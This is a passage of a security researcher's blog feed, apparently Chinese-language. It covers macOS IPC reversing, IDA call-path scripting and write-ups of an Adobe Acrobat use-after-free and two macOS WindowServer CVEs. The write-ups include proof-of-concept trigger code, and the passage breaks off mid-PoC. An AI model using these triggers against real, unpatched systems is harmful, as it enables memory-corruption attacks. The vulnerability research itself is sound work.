title="逆向分析"></a>逆向分析</h2><p>为什么要提及这部分，apple大部分服务都不开源，而且用的IPC方式都不确定，逆向的时候需要想办法确定，并且找到关键函数，比如上例中的foo函数，找到处理函数，方便代码审计。</p><p>这里只需要关注服务端（废话），所以直接贴F5后的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  VendMe *v3; <span class="comment">// rax</span></span><br><span class="line">  VendMe *v4; <span class="comment">// ST28_8</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// ST20_8</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = objc_msgSend(&amp;OBJC_CLASS___VendMe, <span class="string">"alloc"</span>, envp);</span><br><span class="line">  v4 = objc_msgSend(v3, <span class="string">"init"</span>);</span><br><span class="line">  v5 = objc_msgSend(&amp;OBJC_CLASS___NSConnection, <span class="string">"defaultConnection"</span>);</span><br><span class="line">  objc_msgSend(v5, <span class="string">"setRootObject:"</span>, v4);</span><br><span class="line">  objc_msgSend(v5, <span class="string">"registerName:"</span>, CFSTR(<span class="string">"com.foo.my_test_service"</span>));</span><br><span class="line">  v6 = objc_msgSend(&amp;OBJC_CLASS___NSRunLoop, <span class="string">"currentRunLoop"</span>);</span><br><span class="line">  objc_msgSend(v6, <span class="string">"run"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>oc这些函数调用基本都变成<code>objec_msgSend(a,b,xxx)</code>了，不过不太影响看，我的理解就是<br><code>a.b(xxx)</code>，大概这个样子，知道这行代码在做什么，对于逆向已经够了。</p><p>关键点在于找DO的对象以及和他绑定的方法。通过上面的方法，能找到:<code>v4--&gt;v3--&gt;OBJC_CLASS___VendMe</code>,那么就是<code>OBJC_CLASS___VendMe</code>这个对象了，下面是找和他绑定的方法。</p><p>直接找到的是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__objc_data:0000000100001198 _OBJC_CLASS_$_VendMe __objc2_class &lt;offset _OBJC_METACLASS_$_VendMe, \</span><br><span class="line">__objc_data:0000000100001198                                         ; DATA XREF: __objc_classlist:0000000100001060↑o</span><br><span class="line">__objc_data:0000000100001198                                         ; __objc_classrefs:classRef_VendMe↑o</span><br><span class="line">__objc_data:0000000100001198                                offset _OBJC_CLASS_$_NSObject, \</span><br><span class="line">__objc_data:0000000100001198                                offset __objc_empty_cache, 0, offset VendMe_$classData&gt;</span><br></pre></td></tr></table></figure><p>然后根据classData找到 ： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__objc_const:00000001000010D8 VendMe_$classData __objc2_class_ro &lt;0, 8, 8, 0, 0, offset aVendme, \</span><br><span class="line">__objc_const:00000001000010D8                                         ; DATA XREF: __objc_data:_OBJC_CLASS_$_VendMe↓o</span><br><span class="line">__objc_const:00000001000010D8                                   offset _OBJC_INSTANCE_METHODS_VendMe, 0, 0, 0, 0&gt; ; &quot;VendMe&quot;</span><br><span class="line">__objc_const:00000001000010D8 __objc_const    ends</span><br><span class="line">__objc_const:00000001000010D8</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__objc_const:00000001000010B8 _OBJC_INSTANCE_METHODS_VendMe __objc2_meth_list &lt;18h, 1&gt;</span><br><span class="line">__objc_const:00000001000010B8                                         ; DATA XREF: __objc_const:VendMe_$classData↓o</span><br><span class="line">__objc_const:00000001000010C0                 __objc2_meth &lt;offset sel_foo_, offset aVv2008i16, \ ; -[VendMe foo:] ...</span><br><span class="line">__objc_const:00000001000010C0                               offset __VendMe_foo__&gt;</span><br></pre></td></tr></table></figure><p>依靠对<code>classData</code>的引用看。</p><p>其实也可以的知道了DO对象的对象名之后直接搜函数列表，比如:<code>VendeMe:</code>。 这个是在有符号的情况下，不过符号这个看运气了，不一定有 符号。</p><p>VendeMe:foo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl -[VendMe foo:](VendMe *self, SEL a2, <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  NSLog(CFSTR(<span class="string">"%d"</span>), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户的参数从a3开始算。</p><h2 id="这类服务漏洞挖掘"><a href="#这类服务漏洞挖掘" class="headerlink" title="这类服务漏洞挖掘"></a>这类服务漏洞挖掘</h2><p>主动fuzz：找到处理函数，确定类型，然后主动写客户端fuzz。</p><p>被动fuzz：hook处理点，但是要一个一个hook，然后修改数据。</p><p>代码审计：找处理函数，人肉看逻辑。</p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://googleprojectzero.blogspot.com/2015/09/revisiting-apple-ipc-1-distributed_28.html" target="_blank" rel="noopener">revisiting-apple-ipc</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;MacOS-IPC-之-DO&quot;&gt;&lt;a href=&quot;#MacOS-IPC-之-DO&quot; class=&quot;headerlink&quot; title=&quot;MacOS IPC 之 DO&quot;&gt;&lt;/a&gt;MacOS IPC 之 DO&lt;/h1&gt;
    
    </summary>
    
    
    
      <category term="Apple" scheme="http://o0xmuhe.me/tags/Apple/"/>
    
      <category term="MacOS" scheme="http://o0xmuhe.me/tags/MacOS/"/>
    
  </entry>
  
  <entry>
    <title>Adobe Acrobat DC Pro touchup UaF</title>
    <link href="http://o0xmuhe.me/2019/07/16/Adobe-Acrobat-DC-Pro-touchup-UaF/"/>
    <id>http://o0xmuhe.me/2019/07/16/Adobe-Acrobat-DC-Pro-touchup-UaF/</id>
    <published>2019-07-16T05:41:53.000Z</published>
    <updated>2019-07-16T05:50:18.940Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h4><p>应该是18年下半年fuzz到的，不记得哪个版本的<code>Adobe Acrobat DC Pro</code>的<code>UaF</code>了，当时测试的是只能在32位机器上触发，留这个洞留了一个月没管，在19年年初修了。</p><p><code>藏洞藏到最后一无所有。</code></p><a id="more"></a><h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ooo = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"></span><br><span class="line">app.trigger = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    app.doc.embedDocAsDataObject(&#123;<span class="attr">cName</span>:<span class="string">"http://www.B.com"</span>, <span class="attr">oDoc</span>:app.trigger&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//must keep this line</span></span><br><span class="line"><span class="keyword">try</span>&#123;app.doc.newPage(&#123;<span class="attr">nWidth</span>:<span class="number">200</span>, <span class="attr">nHeight</span>:<span class="number">72</span>, <span class="attr">nPage</span>:<span class="number">2</span>&#125;);&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//trigger</span></span><br><span class="line"><span class="keyword">try</span>&#123;ooo.valueOf = app.trigger;&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//must keep this line </span></span><br><span class="line"><span class="keyword">try</span>&#123;ooo.valueOf();&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/o0xmuhe/RealWorldPwn/blob/master/Adobe-Acrobat-DC-Pro-touchup-UaF/uaf_touchup.pdf" target="_blank" rel="noopener">poc.pdf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h4&gt;&lt;p&gt;应该是18年下半年fuzz到的，不记得哪个版本的&lt;code&gt;Adobe Acrobat DC Pro&lt;/code&gt;的&lt;code&gt;UaF&lt;/code&gt;了，当时测试的是只能在32位机器上触发，留这个洞留了一个月没管，在19年年初修了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;藏洞藏到最后一无所有。&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="UaF" scheme="http://o0xmuhe.me/tags/UaF/"/>
    
      <category term="Adobe" scheme="http://o0xmuhe.me/tags/Adobe/"/>
    
  </entry>
  
  <entry>
    <title>IDA自动化分析</title>
    <link href="http://o0xmuhe.me/2019/07/09/IDA%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://o0xmuhe.me/2019/07/09/IDA%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/</id>
    <published>2019-07-09T04:44:51.000Z</published>
    <updated>2019-07-16T05:58:33.615Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-需求"><a href="#0x00-需求" class="headerlink" title="0x00 : 需求"></a>0x00 : 需求</h2><p>​    最近有一些自动化分析bin中调用路径的需求，在查询了一些资料后，组合了一些现有方案，最终完成了自己的这个小工具。</p><p>​    具体需求：</p><pre><code>-    自动分析，后台跑-    分析给定的函数调用路径</code></pre><a id="more"></a><h2 id="0x01-code"><a href="#0x01-code" class="headerlink" title="0x01 : code"></a>0x01 : code</h2><h3 id="python模版"><a href="#python模版" class="headerlink" title="python模版"></a>python模版</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">idc.Wait() <span class="comment"># 等待分析完</span></span><br><span class="line"></span><br><span class="line">.... <span class="comment"># 分析工作</span></span><br><span class="line"></span><br><span class="line">idc.Exit(<span class="number">0</span>) <span class="comment"># 完成后自动退出</span></span><br></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"/Applications/IDA Pro 7.0/ida64.app/Contents/MacOS/ida64"</span> -c -A -S<span class="string">"scan.py"</span> bin</span><br></pre></td></tr></table></figure><h3 id="分析调用路径"><a href="#分析调用路径" class="headerlink" title="分析调用路径"></a>分析调用路径</h3><p>这部分直接用了<a href="https://cloud.tencent.com/info/b21c092ae90226892ae925649189667a.html" target="_blank" rel="noopener">利用IDA Python静态分析函数调用路径</a>里的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_r_call_chain</span><span class="params">(func_name, osintneting)</span>:</span></span><br><span class="line">    <span class="keyword">del</span> r_call_chain[:]</span><br><span class="line">    f_r_call_out = open(<span class="string">'call_&#123;0&#125;_&#123;1&#125;.csv'</span>.format(cur_bin_filename, func_name), <span class="string">'w'</span>)</span><br><span class="line">    get_my_caller(func_name, osintneting, f_r_call_out)</span><br><span class="line">    f_r_call_out.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_my_caller</span><span class="params">(func_name, osintneting, fl)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> ida_kernwin.user_cancelled():</span><br><span class="line">        print(<span class="string">'Cancelled'</span>)</span><br><span class="line">        fl.close()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    str = <span class="string">'&#123;0&#125;\t'</span>.format(func_name)</span><br><span class="line">    r_call_chain.append(str)</span><br><span class="line">    addr = get_name_ea(<span class="number">0</span>, func_name)</span><br><span class="line">    addr_ref_to = get_first_fcref_to(addr)</span><br><span class="line"></span><br><span class="line">    osinteneting_end = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> addr_ref_to == BADADDR:</span><br><span class="line">        osinteneting_end = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> osintneting == <span class="number">-1</span>:</span><br><span class="line">        osinteneting_end = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> osintneting == <span class="number">1</span>:</span><br><span class="line">        osinteneting_end = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> osinteneting_end <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        length = len(r_call_chain)</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> range(length):</span><br><span class="line">            fl.write(r_call_chain[length - idx - <span class="number">1</span>])</span><br><span class="line">            sys.stdout.write(r_call_chain[length - idx - <span class="number">1</span>])</span><br><span class="line">        fl.write(<span class="string">"\n"</span>)</span><br><span class="line">        sys.stdout.write(<span class="string">'\r\n'</span>)</span><br><span class="line">        r_call_chain.pop()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (addr_ref_to != BADADDR) <span class="keyword">and</span> (addr_ref_to != addr):</span><br><span class="line">        parent_func_name = get_func_name(addr_ref_to)</span><br><span class="line">        get_my_caller(parent_func_name, osintneting - <span class="number">1</span>, fl)</span><br><span class="line">        addr_ref_to = get_next_fcref_to(addr, addr_ref_to)</span><br><span class="line">        <span class="keyword">if</span> addr_ref_to == BADADDR:</span><br><span class="line">            r_call_chain.pop()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>##0x03 : reference</p><p><a href="http://answerrrrrrrrr.github.io/2016/09/20/idapython-commandline/" target="_blank" rel="noopener">命令行调用 idapython 脚本</a></p><p><a href="https://cloud.tencent.com/info/b21c092ae90226892ae925649189667a.html" target="_blank" rel="noopener">利用IDA Python静态分析函数调用路径</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-需求&quot;&gt;&lt;a href=&quot;#0x00-需求&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 需求&quot;&gt;&lt;/a&gt;0x00 : 需求&lt;/h2&gt;&lt;p&gt;​    最近有一些自动化分析bin中调用路径的需求，在查询了一些资料后，组合了一些现有方案，最终完成了自己的这个小工具。&lt;/p&gt;
&lt;p&gt;​    具体需求：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-    自动分析，后台跑
-    分析给定的函数调用路径&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
    
      <category term="IDA" scheme="http://o0xmuhe.me/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-2541 __XGetWindowMovementGroup stackoverflow</title>
    <link href="http://o0xmuhe.me/2019/06/19/CVE-2017-2541-XGetWindowMovementGroup-stackoverflow/"/>
    <id>http://o0xmuhe.me/2019/06/19/CVE-2017-2541-XGetWindowMovementGroup-stackoverflow/</id>
    <published>2019-06-19T03:34:46.000Z</published>
    <updated>2019-06-19T03:35:33.452Z</updated>
    
    <content type="html"><![CDATA[<h2 id="basic-info"><a href="#basic-info" class="headerlink" title="basic info"></a>basic info</h2><p>size用户可控，array操作时栈溢出。<br>macOS 10.12.1</p><a id="more"></a><h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">get_window_group_list</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3, __int64 a4, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *total_length; <span class="comment">// r14</span></span><br><span class="line">  __int64 buffer_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size_param; <span class="comment">// er15</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> length; <span class="comment">// eax</span></span><br><span class="line">  __int64 size_get_1; <span class="comment">// ST00_8</span></span><br><span class="line">  _QWORD *buffer; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 idx; <span class="comment">// r13</span></span><br><span class="line"></span><br><span class="line">  total_length = a5;</span><br><span class="line">  buffer_1 = a4;</span><br><span class="line">  size_param = a3;</span><br><span class="line">  v8 = get_window_group(a1);</span><br><span class="line">  v9 = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    length = CFArrayGetCount(v8);               <span class="comment">// user control</span></span><br><span class="line">    <span class="keyword">if</span> ( length &gt; size_param )</span><br><span class="line">      length = size_param;</span><br><span class="line">    *total_length = length;</span><br><span class="line">    size_get_1 = length;</span><br><span class="line">    buffer = <span class="built_in">malloc</span>(<span class="number">8L</span>L * length);              <span class="comment">// size control</span></span><br><span class="line">    idx = <span class="number">0L</span>L;</span><br><span class="line">    CFArrayGetValues(v9, <span class="number">0L</span>L, size_get_1, buffer);</span><br><span class="line">    <span class="keyword">if</span> ( *total_length )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        CFNumberGetValue(buffer[idx++], <span class="number">3L</span>L, buffer_1);<span class="comment">// buffer 's size is controled by user, overflow buffer_1 here</span></span><br><span class="line">        buffer_1 += <span class="number">4L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( idx &lt; *total_length );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *total_length = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>array</code>的<code>size</code>是用户传递的，也就是说可以控制<code>buffer</code>的大小，在中间的循环中，在内存访问操作中因为<code>size</code>用户可控，可以导致<code>buffer_1</code> 溢出。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CGWindowID r[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">mach_msg_return_t</span> ret;</span><br><span class="line"><span class="keyword">msg_t</span> message;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> replyPort = mig_get_reply_port();</span><br><span class="line"></span><br><span class="line"><span class="comment">//go trigger the bug!</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line">message.header.msgh_remote_port = getport;</span><br><span class="line">message.header.msgh_local_port = replyPort;</span><br><span class="line">message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);</span><br><span class="line">message.header.msgh_size = <span class="number">40</span>;</span><br><span class="line">message.header.msgh_id = <span class="number">0x7210</span> + <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">message.NDR = NDR_record;</span><br><span class="line">message.wid = r[<span class="number">0</span>];</span><br><span class="line">message.length = <span class="number">0x2010</span>;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo lldb ./main </span><br><span class="line">r</span><br></pre></td></tr></table></figure><p>难的是poc的构造，主要是传递过来的参数(array)的构造。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/theori-io/zer0con2018_singi" target="_blank" rel="noopener">zer0con2018_singi</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;basic-info&quot;&gt;&lt;a href=&quot;#basic-info&quot; class=&quot;headerlink&quot; title=&quot;basic info&quot;&gt;&lt;/a&gt;basic info&lt;/h2&gt;&lt;p&gt;size用户可控，array操作时栈溢出。&lt;br&gt;macOS 10.12.1&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-2540 _XGetConnectionPSN info leak</title>
    <link href="http://o0xmuhe.me/2019/06/19/CVE-2017-2540-XGetConnectionPSN-info-leak/"/>
    <id>http://o0xmuhe.me/2019/06/19/CVE-2017-2540-XGetConnectionPSN-info-leak/</id>
    <published>2019-06-19T03:32:18.000Z</published>
    <updated>2019-06-20T07:43:16.974Z</updated>
    
    <content type="html"><![CDATA[<h2 id="basic-info"><a href="#basic-info" class="headerlink" title="basic info"></a>basic info</h2><p>uninitialized stack var –&gt; info leak<br>macOS 10.12.1</p><a id="more"></a><h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><p><code>_FindProcessRecByConnectionID</code> 调用失败后，会用未初始化的栈变量做赋值操作，导致信息泄漏。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">NDR_record_t __usercall _XGetConnectionPSN@&lt;rax&gt;(__int64 a1@&lt;rax&gt;, _DWORD *a2@&lt;rdi&gt;, __int64 a3@&lt;rsi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// ST08_8</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  NDR_record_t result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  savedregs = a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a2 &lt; <span class="number">0</span> || a2[<span class="number">1</span>] != <span class="number">0x24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">32</span>) = <span class="number">-304</span>;</span><br><span class="line">    result = NDR_record;</span><br><span class="line">    *(NDR_record_t *)(a3 + <span class="number">24</span>) = NDR_record;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = FindProcessRecByConnectionID((<span class="keyword">unsigned</span> <span class="keyword">int</span>)a2[<span class="number">8</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *(_QWORD *)(v4 + <span class="number">4</span>);</span><br><span class="line">      v5 = *(_QWORD *)(v4 + <span class="number">4</span>) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">0x24</span>) = v6;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">0x28</span>) = v5;                <span class="comment">// uninitialized</span></span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">0x20</span>) = <span class="number">0</span>;</span><br><span class="line">    result = NDR_record;</span><br><span class="line">    *(NDR_record_t *)(a3 + <span class="number">24</span>) = NDR_record;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">4</span>) = <span class="number">44</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">4<span class="keyword">mach_msg_return_t</span> ret;</span><br><span class="line">4<span class="keyword">leak_msg_t</span> message;</span><br><span class="line">4<span class="keyword">mach_port_t</span> replyPort = mig_get_reply_port();</span><br><span class="line">4<span class="built_in">memset</span>(&amp;message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line">4message.header.msgh_remote_port = getport;</span><br><span class="line">4message.header.msgh_local_port = replyPort;</span><br><span class="line">4message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);</span><br><span class="line">4message.header.msgh_size = <span class="number">36</span>;</span><br><span class="line">4message.header.msgh_id = <span class="number">0x7210</span> + <span class="number">0xff</span>;</span><br><span 